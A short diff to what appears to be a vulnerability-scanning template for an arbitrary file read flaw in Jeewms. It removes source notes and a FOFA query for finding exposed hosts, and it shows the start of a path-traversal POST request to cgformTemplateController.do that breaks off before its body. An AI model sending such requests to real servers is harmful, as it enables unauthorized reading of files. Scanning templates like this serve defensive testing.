@@ -3,12 +3,8 @@ info:
   name: Jeewms cgformTemplatecontroller.do 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oaek7iz4quisg5o8'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oaek7iz4quisg5o8
-    fofa: body="url:userController.do?userOrgSelect&userId=" && "loginController.do?changeDefaultOrg"
 http:
 - raw:
   - 'POST /rest/../cgformTemplateController.do?showPic HTTP/1.1
